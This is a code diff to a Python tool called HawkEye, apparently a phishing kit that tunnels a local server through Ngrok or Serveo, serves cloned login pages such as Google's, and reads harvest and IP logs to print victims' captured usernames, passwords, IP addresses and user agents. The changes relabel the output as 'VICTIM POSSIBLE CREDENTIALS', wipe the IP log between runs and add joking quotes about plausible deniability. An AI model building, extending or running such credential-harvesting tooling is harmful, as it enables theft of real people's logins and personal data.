@@ -1,6 +1,7 @@
 import multiprocessing, pathlib, json
 from collections import Counter
 from subprocess import call
+from random import randint
 from shlex import split
 from distutils.dir_util import copy_tree
 from exts.ngrok import Ngrok
@@ -20,6 +21,13 @@ class HawkEye(object):
             print('No Ngrok installation detected, installing...')
             self.ngrok_app.install_ngrok()
         self.serveo_app = Serveo()
+
+        self.quotes = [
+            "There is no patch for human stupidity",
+            "Sniff packets not drugs",
+            "Remember: ''Russian hackers MADE me do it''",
+            "''The important thing is that we maintain Plausible Deniablity'' - Richard Nixon"
+        ]
 
         self.web_paths = {
             'Google': [
@@ -76,7 +84,7 @@ class HawkEye(object):
 
             except ValueError as e: print('Value must be an integer!')
 
-            except KeyboardInterrupt: print(f"\n{RED}{self.quotes[0]}{DEFAULT}"); exit()
+            except KeyboardInterrupt: print(f"\n{RED}{self.quotes[randint(0, len(self.quotes) - 1)]}{DEFAULT}"); exit()
 
         try:
             custom_option = self.load_attack(self.attack_vectors[attack_resp])
@@ -146,6 +154,7 @@ class HawkEye(object):
         cmd_matrix = [
             ['rm', '-Rf', f'{server_path}/*.*'],
             ['rm', '-Rf', f'{server_path}/harvest.log'],
+            ['rm', '-Rf', f'{server_path}/ip.log'],
             ['touch', f'{server_path}/harvest.log'],
             ['touch', f'{server_path}/ip.log'],
             ['cp',  f'{pages_path}/ip.php', 'Server/www/'],
@@ -210,8 +219,10 @@ class HawkEye(object):
                         log_cnt['usernames'] += 1
 
                         print(
-                            f"[{BLUE}Username{DEFAULT}] {username}\n"
-                            f"[{BLUE}Password{DEFAULT}] {password}"
+                            f"{RED}VICTIM POSSIBLE CREDENTIALS{DEFAULT}\n"
+
+                            f"[{GREEN}Username{DEFAULT}] {username}\n"
+                            f"[{GREEN}Password{DEFAULT}] {password}"
                         )
 
                 with open('Server/www/ip.log') as headers:
@@ -222,7 +233,7 @@ class HawkEye(object):
                             'address': None,
                             'user_agent': None
                         }
-
+                        print('..................................................................\n') 
                         for i, key in enumerate(header_targets):
                             #import pdb; pdb.set_trace()
                             if not(i):
@@ -234,7 +245,9 @@ class HawkEye(object):
                                 header_targets[key] = data_blob[-1].strip().split(' ')
                                 #print(header_targets[key])
                                 header_targets[key][1:] = [' '.join(header_targets[key][1:])]
-                            print(f'[{BLUE}{header_targets[key][0]}{DEFAULT}]: {header_targets[key][1]}')                  
+                            print(f'[{BLUE}{header_targets[key][0]}{DEFAULT}]: {header_targets[key][1]}') 
+
+                        print('\n..................................................................')                 
                                 
                         log_cnt['headers'] += 1
                         #address = data_blob[log_cnt['headers']].split(' ')
